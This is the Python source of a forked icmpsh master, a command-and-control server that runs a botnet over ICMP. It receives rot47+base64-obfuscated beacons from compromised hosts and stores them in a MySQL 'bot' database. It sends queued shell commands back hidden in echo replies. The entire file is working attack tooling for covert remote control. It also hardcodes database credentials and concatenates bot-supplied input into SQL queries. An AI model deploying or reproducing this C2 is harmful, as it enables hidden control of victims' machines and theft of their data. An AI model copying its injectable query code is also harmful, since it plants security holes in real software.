#!/usr/bin/env python
#
#  icmpsh - simple icmp command shell (port of icmpsh-m.pl written in
#  Perl by Nico Leidecker <nico@leidecker.info>)
#  Original Copyright (c) 2010, Bernardo Damele A. G. <bernardo.damele@gmail.com>
#
#  Forked by khr0x40sh, 2016, addition of db support, daemon mode, and rot47+base64
#  obfuscation to work with the Galvatron Project 
#   (https://www.github.com/khr0x40sh/galvatron)
#
#  This program is free software: you can redistribute it and/or modify
#  it under the terms of the GNU General Public License as published by
#  the Free Software Foundation, either version 3 of the License, or
#  (at your option) any later version.
#
#  This program is distributed in the hope that it will be useful,
#  but WITHOUT ANY WARRANTY; without even the implied warranty of
#  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#  GNU General Public License for more details.
#
#  You should have received a copy of the GNU General Public License
#  along with this program.  If not, see <http://www.gnu.org/licenses/>.

import os
import select
import socket
import subprocess
import sys
import MySQLdb
import argparse
import base64
import time
import datetime
import threading

def setNonBlocking(fd):
    """
    Make a file descriptor non-blocking
    """

    import fcntl

    flags = fcntl.fcntl(fd, fcntl.F_GETFL)
    flags = flags | os.O_NONBLOCK
    fcntl.fcntl(fd, fcntl.F_SETFL, flags)

def main(src):
    if subprocess.mswindows:
        sys.stderr.write('icmpsh master can only run on Posix systems\n')
        sys.exit(255)
    # Make standard input a non-blocking file
    #stdin_fd = sys.stdin.fileno()
    #setNonBlocking(stdin_fd)	#obsoleted by db
    while 1:
        # Parse command from galvatron database
        try:
 		packet1(src)
        except Exception,e:
        	print "[-] Error: "+str(e)

def packet1(src):
    	db= MySQLdb.connect("localhost", "botnet","1qazXSW@","bot")
	cursor= db.cursor()
	cmd=""
    	try:
        	from impacket import ImpactDecoder
        	from impacket import ImpactPacket
	except ImportError:
	        sys.stderr.write('You need to install Python Impacket library first\n')
	        sys.exit(255)
    	
	# Open one socket for ICMP protocol
    	# A special option is set on the socket so that IP headers are included
    	# with the returned data
    	try:
        	sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
   	except socket.error, e:
        	sys.stderr.write('You need to run icmpsh master with administrator privileges\n')
        	sys.exit(1)

   	sock.setblocking(0)
    	sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)

   	 # Create a new IP packet and set its source and destination addresses
    	ip = ImpactPacket.IP()
    	ip.set_ip_src(src)
    	#ip.set_ip_dst(dst)

    	# Create a new ICMP packet of type ECHO REPLY if in our blacklist/not on whitelist (coming soon)
    	icmp = ImpactPacket.ICMP()
    	icmp.set_icmp_type(icmp.ICMP_ECHOREPLY)
    	#else send reply with command in it
    

    	# Instantiate an IP packets decoder
    	decoder = ImpactDecoder.IPDecoder()
	# Wait for incoming replies
        if sock in select.select([ sock ], [], [])[0]:
            buff = sock.recv(65507)	# bug, if our data exceeds, will throw an error.  Maybe max size of ipv4 packet 65507? Testing needs to be done 

            if 0 == len(buff):
                # Socket remotely closed
                sock.close()
                sys.exit(0)

            # Packet received; decode and display it
            ippacket = decoder.decode(buff)
	    #print ippacket.get_ip_src()
            dst = ippacket.get_ip_src()
	    ip.set_ip_dst(dst)
	    icmppacket = ippacket.child()

            # If the packet matches, report it to the user
#            if ippacket.get_ip_dst() == src and ippacket.get_ip_src() == dst and 8 == icmppacket.get_icmp_type():
	    if ippacket.get_ip_dst() == src and 8 == icmppacket.get_icmp_type():            
		# Get identifier and sequence number
                ident = icmppacket.get_icmp_id()
                seq_id = icmppacket.get_icmp_seq()
                data = icmppacket.get_data_as_string()

                if len(data) > 0:
                    sys.stdout.write(data+"\n")

     		# Set sequence number and identifier
                icmp.set_icmp_id(ident)
                icmp.set_icmp_seq(seq_id)
		now = datetime.datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S.%f')
        	print "\n\n%s request %s (%s):" % ("ICMP", now, dst)
                print len(data), data.encode('hex')
		

		if data.find("idu")==-1:
			sys.stdout.write("standard ICMP request, sending standard ICMP reply\n") 
			icmp.contains(ImpactPacket.Data(str(data)))
		else:
			#parse
			multi_amp= data.split('&')
			idu =multi_amp[1].split('=')[1]
			ipX=dst
			pc=de64(multi_amp[2][2:])
			timeX=de64(multi_amp[3][2:])
			comm=de64(multi_amp[4][2:])
			output1=de64(multi_amp[5][2:])
			ts=int(time.time())

			print ";; PC: "+pc+", IDU: "+idu
			print ";; TIMESTAMP: "+str(ts)
			print ";; COMMAND:\n;; "+comm
			print ";; OUTPUT:\n;; "+output1			
			
			item = db_exec(cursor,"SELECT id FROM bot WHERE idu='"+idu+"'")
			if item:
				print ";; Item: "+str(item[0])
				db_exec(cursor,"UPDATE bot SET ip='"+ipX+"', pc='"+pc+"', date='"+str(ts)+"', conn='icmp' WHERE idu='"+idu+"'")
				if len(output1) > 0:
					db_exec(cursor,"INSERT INTO output1 VALUES('', '"+idu+"', '"+str(ts)+"', '"+comm+"', '"+output1+"')")
			else:
				db_exec(cursor,"INSERT INTO bot VALUES('', '"+idu+"', '"+ipX+"', '"+pc+"', '"+str(ts)+"','stop', '"+str(timeX)+"', 'icmp')")
			cmd = db_exec(cursor,"SELECT comando FROM bot WHERE idu='"+idu+"'")
			#print ";; CMD: "+cmd[0]
			cmdX= en64(cmd[0]) 
                	icmp.contains(ImpactPacket.Data(cmdX))# Include the command as data inside the ICMP packet
			if cmd[0].find("stop")==-1:
				db_exec(cursor,"UPDATE bot SET comando='stop' WHERE idu='"+idu+"'")
                # Calculate its checksum
                icmp.set_icmp_cksum(0)
                icmp.auto_checksum = 1

                # Have the IP packet contain the ICMP packet (along with its payload)
                ip.contains(icmp)
                # Send it to the target host
		print "---- Reply:"
		#print len(icmp),display.encode(hex)
		print ";; Command: "+cmd[0]
		print ";; Encoded Command: "+ cmdX
                sock.sendto(ip.get_packet(), (dst, 0))
		cursor.close()
		print "################\n"

def rot47(s):
    #https://rot47.net/_py/rot47.txt
    x = []
    for i in xrange(len(s)):
        j = ord(s[i])
        if j >= 33 and j <= 126:
            x.append(chr(33 + ((j + 14) % 94)))
        else:
            x.append(s[i])
    last= ''.join(x)
    #print last
    return last

def de64(instr):
	try:
	#	print "string:"+instr+"\n"
		instr=base64.b64decode(instr)
	#	print "de64:"+instr+"\n"
		return rot47(instr)
	except Exception, e:
    		print 'Failed to de64: '+ str(e)
		return "ERROR"

def en64(instr):
	instr = rot47(instr)
	return base64.b64encode(instr)

def db_exec(cursor,string):
	cursor.execute(string)
	back=cursor.fetchone()
	return back

if __name__ == '__main__':
    if len(sys.argv) < 2:
        msg = 'missing mandatory options. Execute as root:\n'
        msg += './icmpsh-m.py [-d][-h] <bind IP address>\n'
        sys.stderr.write(msg)
        sys.exit(1)
    arg1=sys.argv[1]
    print arg1
    t = threading.Thread(target=main, args = (arg1,))	#ok so I needed a tuple here...
    t.daemon = False
    t.start()
    
    #main(sys.argv[1])
